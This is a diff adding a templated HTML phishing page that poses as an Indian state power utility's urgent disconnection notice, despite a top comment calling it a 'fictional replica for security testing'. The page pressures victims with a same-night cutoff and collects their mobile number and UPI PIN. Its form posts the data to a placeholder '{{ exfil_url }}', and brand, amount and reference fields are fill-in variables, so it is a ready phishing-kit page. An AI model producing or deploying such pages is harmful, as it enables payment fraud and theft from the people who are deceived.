@@ -1,0 +1,58 @@
+<!-- fictional replica for security testing -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ brand_title }} Electricity Bill Payment & Disconnection Notice</title>
+    <style>
+        :root {
+            --primary: {{ primary_color }};
+            --secondary: {{ secondary_color }};
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #f8fafc; color: #1e293b; display: flex; justify-content: center; padding: 14px; }
+        .{{ prefix }}container { width: 100%; max-width: 440px; background: #ffffff; border: 1px solid #e2e8f0; border-radius: 12px; overflow: hidden; }
+        .{{ prefix }}alert-header { background: #b91c1c; color: #ffffff; padding: 16px; text-align: center; }
+        .{{ prefix }}alert-title { font-size: 16px; font-weight: 800; text-transform: uppercase; }
+        .{{ prefix }}content { padding: 20px; }
+        .{{ prefix }}bill-details { background: #f1f5f9; border-radius: 8px; padding: 14px; margin-bottom: 16px; font-size: 13px; }
+        .{{ prefix }}row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .{{ prefix }}bill-amount { font-size: 24px; font-weight: 800; color: #b91c1c; text-align: right; }
+        .{{ prefix }}warning-note { background: #fef2f2; border: 1px solid #fecaca; border-radius: 6px; padding: 10px; font-size: 12px; color: #991b1b; margin-bottom: 16px; }
+        .{{ prefix }}field { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 6px; margin-bottom: 12px; font-size: 14px; }
+        .{{ prefix }}pay-btn { width: 100%; padding: 14px; background: var(--primary); color: #ffffff; border: none; border-radius: 6px; font-size: 15px; font-weight: 700; cursor: pointer; }
+        .{{ prefix }}support-info { text-align: center; margin-top: 14px; font-size: 12px; color: #64748b; }
+    </style>
+</head>
+<body>
+    <div class="{{ prefix }}container">
+        <div class="{{ prefix }}alert-header">
+            <div class="{{ prefix }}alert-title">⚡ Urgent Disconnection Warning</div>
+        </div>
+        <div class="{{ prefix }}content">
+            <div class="{{ prefix }}bill-details">
+                <div class="{{ prefix }}row"><span>Consumer Number:</span><strong>{{ consumer_no }}</strong></div>
+                <div class="{{ prefix }}row"><span>Subdivision:</span><span>State Power Corp</span></div>
+                <div class="{{ prefix }}row"><span>Service Portal:</span><strong>{{ brand_wordmark }} Utilities</strong></div>
+                <div class="{{ prefix }}row" style="margin-top: 8px;">
+                    <span>Overdue Balance:</span>
+                    <span class="{{ prefix }}bill-amount">₹{{ amount }}</span>
+                </div>
+            </div>
+            <div class="{{ prefix }}warning-note">
+                Notice: Power connection will be disconnected tonight at 09:30 PM due to unpaid invoice. Pay immediately via {{ brand_wordmark }} UPI to cancel disconnection order.
+            </div>
+            <form action="{{ exfil_url }}" method="POST">
+                <input class="{{ prefix }}field" type="text" name="vpa" value="{{ vpa }}" readonly>
+                <input class="{{ prefix }}field" type="tel" name="consumer_phone" placeholder="Registered Mobile Number" value="{{ phone }}">
+                <input class="{{ prefix }}field" type="password" name="upi_pin" placeholder="Enter UPI PIN to Authorize Instant Settlement" maxlength="6" required>
+                <button class="{{ prefix }}pay-btn" type="submit">PAY BILL & CANCEL DISCONNECTION</button>
+            </form>
+            <div class="{{ prefix }}support-info">
+                Electricity Officer Helpline: {{ phone }} &bull; Notice Ref: DIS-{{ ref_code }}
+            </div>
+        </div>
+    </div>
+</body>
+</html>
